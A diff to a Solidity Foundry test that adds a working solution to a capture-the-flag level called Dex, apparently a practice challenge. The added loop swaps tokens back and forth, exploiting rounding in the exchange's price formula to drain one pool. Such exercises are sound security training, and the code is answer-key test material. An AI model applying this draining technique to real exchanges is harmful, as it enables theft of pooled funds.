@@ -58,6 +58,28 @@ contract TestDex is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        instance.approve(address(instance), 200);
+        address from = instance.token1();
+        address to = instance.token2();
+        while(true){
+            uint256 instanceFromBalance = SwappableToken(from).balanceOf(address(instance));
+            uint256 instanceToBalance = SwappableToken(to).balanceOf(address(instance));
+            uint256 fromAmount = SwappableToken(from).balanceOf(player);
+            uint256 toAmount = fromAmount * instanceToBalance / instanceFromBalance;
+            bool isBreak;
+            if (toAmount > instanceToBalance){
+                while(true){
+                    fromAmount = fromAmount - 1;
+                    toAmount = fromAmount * instanceToBalance / instanceFromBalance;
+                    if (toAmount <= instanceToBalance){
+                        break;
+                    }
+                }
+                isBreak = true;
+            }
+            instance.swap(from, to, fromAmount);
+            if (isBreak) break;
+            (from, to) = (to, from);
+        }
     }
 }
